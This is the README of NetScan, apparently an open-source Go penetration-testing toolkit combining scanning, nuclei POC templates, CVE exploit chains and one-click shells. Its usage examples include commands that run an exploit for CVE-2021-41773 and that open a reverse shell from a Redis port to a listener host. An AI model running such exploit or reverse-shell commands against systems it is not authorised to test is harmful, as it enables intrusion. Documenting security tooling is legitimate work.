# NetScan

An all-in-one network scanner written in Go, available as both a **CLI** and a **GUI**. It combines host discovery, port scanning, service/OS detection, vulnerability detection, exploitation, one-click shells, web reconnaissance, fuzzing, and a plugin/module/dictionary/POC platform.

> Chinese documentation: [README.md](README.md)

## Highlights

- **Port scanning**: TCP/UDP, CIDR/range targets, service and OS fingerprinting (nerva + built-in probes)
- **Web fingerprinting**: built-in CMS rules + wappalyzergo (MIT)
- **Vulnerability detection**: 5,380 real nuclei-based POC templates (official MIT set + maintained extras), soft-404 baselines
- **Exploitation**: verified exploit chains for 13+ CVEs (httpd, Redis, ActiveMQ, Grafana, Rails, Node, uWSGI, Jetty, Kibana, Nginx UI, Flink, Elasticsearch, Joomla)
- **Web recon**: directory brute force, subdomain brute force, HTTP headers, Whois, DNS records
- **Fuzzing**: integrated ffuf engine (`--fuzz-*`)
- **Built-in dictionaries**: PayloadsAllTheThings (`builtin:<name>`)
- **GUI**: scan, web recon, fuzzing, exploits, assets, plugins, tools; built-in POC batch runner with selectable template count

## Quick Start

```bash
netscan -version
netscan -h
netscan -target 192.168.1.1 -p 1-1000 -sV
netscan -target 192.168.1.1 -p 8080 --poc
netscan -target 192.168.1.1 -p 8080 --poc-id CVE-2021-41773
netscan -target 192.168.1.1 -p 8080 --exploit CVE-2021-41773
```

Launch the GUI by running `netscan-gui-windows-x64.exe`.

## Input Formats

| Flag | Accepted values | Examples |
|---|---|---|
| `-target` | IP / hostname / CIDR / IPv4 range | `192.168.1.1`, `example.com`, `192.168.1.0/24`, `192.168.1.1-50` |
| `-p` | single / comma list / range / service names | `80`, `80,443`, `1-1000`, `http,ssh,3306` |

Scan types: `-sT` TCP connect (default), `-sU` UDP, `-Pn` skip discovery, `-T4` faster timing.
Detection: `-sV` versions, `-O` OS, `--fp` web fingerprint, `--banner` banners.

## Common Commands

```bash
# Scanning
netscan -target 192.168.1.0/24 -p 22,80,443 -sT -sV -O
netscan -target 192.168.1.1 -p 53,123 -sU
netscan -target example.com -p 80 --fp --banner -oH report.html

# POC / vulnerability library
netscan -target 192.168.1.1 -p 80 --poc
netscan -target 192.168.1.1 -p 8080 --poc-id CVE-2021-41773
netscan -target 192.168.1.1 -p 8080 --poc-id CVE-2021-41773 --poc-debug
netscan -target 192.168.1.1 -p 80 --poc --oast 192.168.1.10:9999
netscan -target 192.168.1.1 -p 80 --scan-vuln

# Exploitation / shells
netscan --exploit-list
netscan -target 192.168.1.1 -p 8080 --exploit CVE-2021-41773
netscan -target 192.168.1.1 -p 6379 --get-shell --lhost 10.0.0.1 --lport 4444

# Web recon / fuzzing
netscan -target example.com -p 80 -dir
netscan -target example.com -sub --sub-depth 2
netscan -target example.com -whois
netscan -target example.com -dnsq
netscan -h    # shows all --fuzz-* flags
```

## Documentation

- [RELEASE_NOTES.en.md](RELEASE_NOTES.en.md)
- [THIRD_PARTY_NOTICES.en.md](THIRD_PARTY_NOTICES.en.md)
- Chinese: [README.md](README.md), [RELEASE_NOTES.md](RELEASE_NOTES.md), [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md)

## License

MIT. Third-party components and their licenses are listed in [THIRD_PARTY_NOTICES.en.md](THIRD_PARTY_NOTICES.en.md).
